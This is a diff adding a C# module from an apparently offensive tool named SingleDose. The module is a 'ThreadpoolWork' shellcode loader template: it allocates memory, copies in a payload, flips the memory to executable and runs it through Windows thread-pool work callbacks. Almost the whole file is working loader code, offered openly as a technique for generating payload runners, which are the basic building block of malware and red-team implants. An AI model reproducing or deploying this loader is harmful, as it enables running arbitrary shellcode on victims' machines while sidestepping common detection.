@@ -1,0 +1,59 @@
+﻿using System.Collections.Generic;
+
+namespace SingleDose.Techniques.Loaders
+{
+    internal class ThreadpoolWork : ITechnique
+    {
+        string ITechnique.TechniqueName => "ThreadpoolWork";
+
+        string ITechnique.TechniqueDescription => null;
+
+        List<string> ITechnique.TechniqueReferences => new List<string>() {
+            @"https://github.com/Wra7h/FlavorTown"
+        };
+
+        bool ITechnique.IsUnsafe => false;
+
+        bool ITechnique.IsLoader => true;
+        
+        List<string> ITechnique.PInvokeRecipe => new List<string>() { "VirtualAlloc", "CreateThreadpoolWork", "SubmitThreadpoolWork", "WaitForThreadpoolWorkCallbacks", "CloseThreadpoolWork" };
+        
+        List<string> ITechnique.Prerequisites => null;
+        
+        string ITechnique.Base => @"
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Linq;
+
+namespace {{NAMESPACE}}
+{
+    class Program
+    {
+        public static void Main(string[] args)
+        {
+            {{MODE}}
+            {{TRIGGER}}
+            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
+            Marshal.Copy(payload, 0, hAlloc, payload.Length);
+            {{PROTECT}}
+            IntPtr TPWork = CreateThreadpoolWork(hAlloc, IntPtr.Zero, IntPtr.Zero);
+            SubmitThreadpoolWork(TPWork);
+            WaitForThreadpoolWorkCallbacks(TPWork, false);
+
+            if (TPWork != IntPtr.Zero)
+            {
+                CloseThreadpoolWork(TPWork);
+            }
+        }
+        {{ARGS}}
+        {{PINVOKE}}
+    }
+}";
+
+        string ITechnique.VProtect => @"uint oldProtect;
+            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
+    }
+}
